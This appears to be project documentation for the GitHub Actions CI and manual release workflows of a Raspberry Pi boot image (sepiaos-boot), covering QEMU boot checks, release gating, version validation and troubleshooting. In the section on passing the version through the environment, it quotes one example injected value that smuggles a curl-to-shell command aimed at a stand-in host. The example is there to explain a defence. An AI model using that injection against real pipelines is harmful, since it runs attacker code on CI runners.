# Continuous integration on GitHub

Two workflows, both on GitHub Actions:

- [`.github/workflows/ci.yml`](../.github/workflows/ci.yml) — builds and boots
- [`.github/workflows/release.yml`](../.github/workflows/release.yml) — publishes

## CI

| Job | When | What |
|---|---|---|
| `board` (matrix) | every push, PR against `main`, manual | one job per board: builds it, lists the partition, and QEMU-boots it |
| `universal` | push to `main` only | builds the all-boards card and boots that one card as `pi-zero2w`, `pi3`, `pi4` and `cm4` in turn |

The `board` matrix has six entries. Four are booted; `pi5` and `cm5` are built
only and emit a `::notice`, because QEMU has no BCM2712 machine type. The jobs
run in parallel and `fail-fast` is off, so one broken board still reports on the
other five. When an emulable board fails, its serial log is uploaded as a
`boot-log-<board>` artifact.

`universal` is gated to `main` so a pull request stays at six jobs, and it is
the last gate before a release: it is the only job that runs `verify-firmware`,
which is possible there because the manifest in `checksums/` covers exactly the
universal artifact set.

## Release

**Always manual.** Nothing publishes on a push, a merge or a tag; the version is
a human decision, so a human types it in. Run it from the Actions tab → Release
→ *Run workflow*:

| Field | |
|---|---|
| *Use workflow from* | branch or tag to release — this is the commit that gets built and tagged |
| `version` | required, e.g. `2026.08.27`, `1.0.0` or `1.0.0-rc1`; a leading `v` is added if you leave it off |
| `prerelease` | tick to publish without marking it Latest |

| Job | Runs on | What |
|---|---|---|
| `gate` | bare `ubuntu-latest` | validates the version, requires a green CI run for the commit, refuses a taken tag |
| `build` | `debian:trixie-slim` | rebuilds the universal card, re-checks the pinned manifest, `xz -9`, checksums |
| `publish` | bare `ubuntu-latest` | creates the tag and the release, uploads both assets |

The release is tagged `v<version>` and carries two assets:

```
sepiaos-boot-universal-v<version>.img.xz    the universal card, xz-compressed (~22 MB)
SHA256SUMS                                  its checksum
```

### Why `gate` is a separate job

Everything that can say "no" is cheap, and the build is not. Validating the
version, checking CI and checking the tag all happen on a bare runner in
seconds, so a typo'd version or an already-used tag fails immediately instead of
after a full image build.

It is also where the safety property lives. An automatic trigger would give
"CI passed on this commit" for free; a manual trigger cannot, so `gate` asks the
API for a successful `ci.yml` run whose `head_sha` is the commit being released
and stops if there is none.

### Why the version is passed through the environment

`inputs.version` is attacker-controlled text, and `${{ }}` is substituted into
the script *before* bash parses it — a version of `x"; curl evil | sh; #` would
run as a command. It therefore reaches the script as `$VERSION` via `env:`,
where it is only ever data, and is validated against
`^[0-9][0-9A-Za-z.+-]*$` before anything is named after it.

Leading and trailing whitespace is trimmed, but internal whitespace is
rejected rather than removed: silently turning a fat-fingered `1.0 0` into
`1.00` would release the wrong version under a plausible-looking tag.

### Why the release is built twice

`build` rebuilds rather than reusing CI's artifact, in the same container image,
because mtools decides the FAT layout: building the shipped image on a different
distribution would ship an image that is not the one the boot checks passed on.

### Why publishing is a separate job

Only so it can run on the bare runner, where `gh` is preinstalled. Debian does
not package the GitHub CLI, so publishing from the build container would mean
either a third-party action or hand-rolled REST calls.

## One-time setup

No repository secret is required. The release uses GitHub's automatically
provided `GITHUB_TOKEN`. `contents: write` is granted to the `publish` job
alone; every other job in both workflows is read-only.

## Notes on the pipelines

**Why `debian:trixie-slim`.** QEMU's `raspi4b` machine only arrived in **QEMU
9.0**. Debian 12 ships 7.2 and Ubuntu 24.04 ships 8.2, so on either of those the
Pi 4 and CM4 boot checks cannot run at all. Trixie ships QEMU 10.x. If you
change the base image, check `qemu-system-aarch64 -machine help | grep raspi4b`
first.

**Why the build tools are installed before `actions/checkout`.** Without `git`
in the container, checkout silently falls back to downloading a tarball — and
the Makefile needs `git` for the sparse overlays clone. `bsdextrautils` supplies
the `hexdump` that `make verify` uses; `xz-utils` is needed only for the
release.

**Why `QEMU_TIMEOUT: 180`.** GitHub's hosted runners run the AArch64 kernels
under full TCG emulation. That is correct but much slower than an arm64 host,
and the Makefile's 40-second default is not enough headroom.

**Why tag events do not trigger CI.** `branches:` never matches a tag ref, so
cutting a release cannot start a second pipeline for the commit it just built.

**No download caching.** Every job re-fetches the ~28 MB of firmware. Adding a
cache is possible but was left out deliberately: the download is small, it keeps
the pipeline free of plugin dependencies, and it is polite to donated
infrastructure to keep the config simple.

**What a green pipeline does and does not prove.** QEMU emulates the ARM side
only. It never executes `bootcode.bin`, `start.elf`, `config.txt`, device tree
auto-selection or overlay loading, so a green boot check attests to the kernel
and the partition layout and nothing else. No `config.txt` change is verified by
CI; only real hardware tests it.

## Reproducing a CI failure locally

Both workflows only call documented `make` targets, so any failure reproduces
directly:

```sh
make BOARD=pi4 image
make BOARD=pi4 boot-check
make BOARD=universal QEMU_BOARD=pi4 boot-check
```

To reproduce in the same container the runner uses:

```sh
docker run --rm -it -v "$PWD:/src" -w /src debian:trixie-slim bash -c '
  apt-get update -qq
  apt-get install -y -qq --no-install-recommends \
    make mtools qemu-system-arm git curl ca-certificates xz-utils bsdextrautils
  QEMU_TIMEOUT=180 make BOARD=pi4 boot-check'
```

## Troubleshooting

**Everything is skipped / no workflow appears.**
Check that Actions are enabled in the repository and that the workflow file is
present on the branch being tested. `Release` will not appear in the Actions tab
at all until `release.yml` has landed on the default branch — GitHub only offers
*Run workflow* for a `workflow_dispatch` workflow it can see there.

**Boot checks time out.**
The runner is slower than usual. Raise `QEMU_TIMEOUT` in the workflow `env:`.

**`raspi4b` is not a supported machine.**
The base image's QEMU is older than 9.0. See the note above.

**CI passed but no release appeared.**
Expected — releases are never automatic. Trigger `Release` by hand.

**`No green CI run`.**
The commit you are releasing from has no successful `ci.yml` run. Either it was
never pushed, CI is still running, or CI failed. Push it and wait, or re-run CI
on it. Note that this asks about the exact commit: releasing from a branch whose
tip has moved since the last green run will fail here, correctly.

**`Bad version`.**
The `version` input must start with a digit and contain only digits, letters,
`.`, `+` and `-` — `2026.08.27`, `1.0.0`, `1.0.0-rc1`. A leading `v` is
optional. Branch names, paths and anything with a space are rejected.

**`<tag> already released` / `<tag> already tagged`.**
Pick a different version, or remove what is there — `gh release delete <tag>
--cleanup-tag` for a release, `git push --delete origin <tag>` for a bare tag.
Both checks run in `gate`, before anything is built or created, so there is
never a half-finished release to clean up. `gh release create --target` also
makes the tag as part of the release, so "tag exists but the release does not"
cannot arise from a failure partway through publishing.
